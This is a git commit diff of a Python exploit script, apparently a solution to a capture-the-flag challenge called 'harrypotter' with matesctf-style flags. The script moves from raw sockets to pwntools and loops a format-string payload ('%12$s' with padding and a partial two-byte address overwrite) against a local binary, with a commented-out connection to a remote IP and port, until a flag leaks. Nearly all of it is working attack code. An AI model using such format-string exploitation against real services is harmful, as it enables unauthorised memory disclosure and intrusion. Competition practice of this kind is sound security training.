dc0e8f051132e0584af8957c124bafc95b1662d4
NOT <nguyenoanhthuong95@gmail.com>
2018-04-23 23:53:08 +0700

    Update harrypotter.py

--- harrypotter/harrypotter.py
+++ harrypotter/harrypotter.py
@@ -1,35 +1,23 @@
-import telnetlib
-import socket
-import struct 
-import time
+from pwn import *
 
-def recvuntil(t):
-    data = ''
-    while not data.endswith(t):
-        tmp = s.recv(1)
-        if not tmp: break
-        data += tmp
-
-    return data
 i = 0
 while True:
-	host = "125.235.240.168"
-	port = 27017
-	s = socket.create_connection((host, port))
+	r = process("./harrypotter")
+	#r = remote("125.235.240.168",27017)
+	context.log_level = "critical"
 	print i
 	i += 1
 	payload = '%12$s'
 	payload = payload.ljust(0x30,'B')
-	payload += "\xf0\x41"
-	
-	recvuntil("It's time to cast your spell\n")
-	s.send(payload)
+	payload += "\x60\xdc"
+	r.recvuntil("It's time to cast your spell\n")
+	r.send(payload)
 	try:
 		msg = r.recv()
 		#print msg
 		if "matesctf{" in msg and "matesctf{}" not in msg:
 			print msg
 			break
-		s.close()
+		r.close()
 	except:
-		s.close()	
+		r.close()	
